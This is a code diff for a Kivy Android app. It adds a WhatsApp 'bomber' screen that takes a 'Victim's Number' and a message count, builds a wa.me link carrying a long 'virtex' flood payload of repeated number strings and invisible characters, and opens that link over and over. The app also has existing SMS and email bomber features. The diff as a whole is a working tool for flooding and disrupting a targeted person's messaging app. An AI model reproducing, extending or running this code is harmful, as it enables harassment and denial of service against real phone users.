@@ -1,15 +1,17 @@
+import os
+import sys
 def install(package):
 	for i in package:
 		try:
 			exec(f"import {i}")
 			pass
 		except Exception:
-			print("Installing {i}")
+			print(f"Installing {i}")
 			os.system(f"pip3 install {i}")
 	return None
 install(["kivy","kivymd","requests","plyer"])
 
-
+import webbrowser
 import os
 from kivymd.app import MDApp
 from kivymd.uix.label import MDLabel
@@ -31,7 +33,9 @@ import sys
 import threading
 from pathlib import Path
 from kivy.clock import Clock
-
+from functools import partial
+from kivymd.icon_definitions import md_icons
+screen_manager = ScreenManager()
 android_plat = True
 mainScreen = """
 MDScreen:	
@@ -95,6 +99,7 @@ MDScreen:
 				
 
 """
+import time
 net ="""
 MDScreen:
 	name : "net"
@@ -195,6 +200,7 @@ MDScreen:
 		font_size : "20sp"
 		text_color : 0,1,0,1
 		line_color :0,1,0,1
+		on_press : app.wp()
 	MDRectangleFlatIconButton:
 		text :  "       Email Bomber       "
 		pos_hint : {"center_x":0.5,"center_y":0.35}
@@ -206,7 +212,7 @@ MDScreen:
 		text_color : 1,0,0,1
 		line_color :1,0,0,1
 	MDLabel:
-		text:" Developers : Ansh Dadwal , Krishna "
+		text:" Developers : Ansh Dadwal , Krishna , Sando Varghese "
 		font_style : "Caption"	
 		font_name : "Poppins-Regular.ttf"
 		pos_hint : {"center_x":0.5,"center_y":0.02}
@@ -217,9 +223,39 @@ MDScreen:
 		size_hint_x: 0.55
 		
 """
+wp2 = """
+MDScreen:
+	name : "wp2"
+	MDFloatLayout:
+		md_bg_color : 1,1,1,1
+
+		Image:
+			source : "progress.gif"
+			halign : "center"			
+			size_hint_y: 0.49
+			size_hint_x: 0.49
+			anim_delay: 0.05
+    		allow_stretch: True
+    		pos_hint :  {"center_x":0.5,"center_y":0.65}
+    	MDLabel:
+    		text:"  Bombing In Progress"
+    		font_name : "Poppins-Regular.ttf"
+    		font_size : "30sp"
+    		pos_hint : {"center_x":0.5,"center_y":0.90}
+    	MDRectangleFlatIconButton:
+			text : " HOME "
+			pos_hint : {"center_x":0.5,"center_y":0.35}
+			icon: "home"
+			on_press : app.home()  
+"""
 phno="""
 MDScreen:
 	name:"phnno"
+	MDIconButton:
+        icon: "backburger"
+        pos_hint: {"center_x":0.1, "center_y": 0.95}
+        text: "Back"
+        on_press : app.home()
 	MDLabel:
 		text : "Phone Number"
 		font_name : 'Poppins-Regular.ttf'
@@ -231,11 +267,7 @@ MDScreen:
 		font_size : '20sp'
 		them_text_color : 'caption'
 		pos_hint : {"center_x":0.68,"center_y":0.85}
-	Image:
-		source : "logo.png"
-		size_hint_y: 0.10
-		size_hint_x: 0.10
-		pos_hint : {"center_x":0.1,"center_y":0.85}
+
 	MDTextField:
 		id : input
 		hint_text : "Indian Number "
@@ -270,18 +302,81 @@ MDScreen:
 		Image:
 			source : "done.gif"
 			halign : "center"			
-			size_hint_y: 0.59
-			size_hint_x: 0.59
+			size_hint_y: 0.49
+			size_hint_x: 0.49
 			anim_delay: 0.05
     		allow_stretch: True
     		pos_hint :  {"center_x":0.5,"center_y":0.65}
 	MDRectangleFlatIconButton:
 		text : " HOME "
-		pos_hint : {"center_x":0.5,"center_y":0.45}
+		pos_hint : {"center_x":0.5,"center_y":0.35}
 		icon: "home"
 		on_press : app.home()  			
 """
+wpb = """
+MDScreen:
+	name:"wpbomb"
+	MDIconButton:
+        icon: "backburger"
+        pos_hint: {"center_x":0.1, "center_y": 0.95}
+        text: "Back"
+        on_press : app.home()
+	MDLabel:
+		text : "Phone Number"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '35sp'
+		pos_hint : {"center_x":0.55,"center_y":0.90}
+	MDLabel:
+		text : "Enter CC and Number"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '20sp'
+		them_text_color : 'caption'
+		pos_hint : {"center_x":0.68,"center_y":0.85}
 
+	MDTextField:
+		id : input
+		hint_text : "Country Code without +"
+		mode:"rectangle"
+		halign :"center"
+		pos_hint : {"center_x":0.5,"center_y":0.65}
+		max_text_length: 3
+		size_hint_y :0.10
+		size_hint_x : 0.6
+		required: True
+	MDTextField:
+		id : input1
+		hint_text : "Victim's Number"
+		mode:"rectangle"
+		halign :"center"
+		pos_hint : {"center_x":0.5,"center_y":0.55}
+		size_hint_y :0.10
+		size_hint_x : 0.6
+		required: True
+		max_text_length :10
+	MDTextField:
+		id : input2
+		hint_text : "Number of messages"
+		mode:"rectangle"
+		halign :"center"
+		pos_hint : {"center_x":0.5,"center_y":0.45}
+		size_hint_y :0.10
+		size_hint_x : 0.6
+		required: True
+		max_text_length : 2
+	MDRectangleFlatIconButton:
+		text : " SEND "
+		pos_hint : {"center_x":0.5,"center_y":0.35}
+		icon: "send"
+		on_press : app.wpsend(input.text+input1.text,int(input2.text))
+"""
+def test(ok):
+	screen_manager.current="success"	
+def wpbomb(number,times):
+	link = (f"""https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
+""")
+	for i in range(0,times):
+		Clock.schedule_once(partial (webbrowser.open,link),4)
+	Clock.schedule_once(partial(test),times*4)
 
 import urllib.parse
 import requests
@@ -297,10 +392,12 @@ def check_intr():
 	except Exception as e:
 		return False
 	return  True
-screen_manager = ScreenManager()
+
 class MyApp(MDApp):
 	a = 0	
 	b = f"No internet {a}"
+	def wp(self):
+		screen_manager.current = "wpbomb"
 	def reload(self):
 		if check_intr() == True:
 			screen_manager.current = "net"
@@ -314,6 +411,8 @@ class MyApp(MDApp):
 		screen_manager.add_widget(Builder.load_string(mainv))
 		screen_manager.add_widget(Builder.load_string(phno))
 		screen_manager.add_widget(Builder.load_string(success))
+		screen_manager.add_widget(Builder.load_string(wpb))
+		screen_manager.add_widget(Builder.load_string(wp2))
 		return screen_manager
 	def home(self):
 
@@ -335,6 +434,10 @@ class MyApp(MDApp):
 	def send(self,message,number):
 		send_sms(message,number)
 		screen_manager.current = "success"
+	def wpsend(self,number,times):
+		screen_manager.current = "wp2"
+		wpbomb (number,times)
+		
 	def permission(self):
 		Path("eula.txt").touch()
 		if check_intr() == True:
